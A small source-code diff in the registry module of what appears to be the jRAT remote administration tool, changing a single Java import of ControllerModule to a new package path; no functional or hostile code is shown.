@@ -1,6 +1,6 @@
 package jrat.module.registry;
 
-import apiv2.ControllerModule;
+import jrat.controller.api.ControllerModule;
 import iconlib.IconUtils;
 import jrat.controller.AbstractSlave;
 import jrat.controller.Slave;
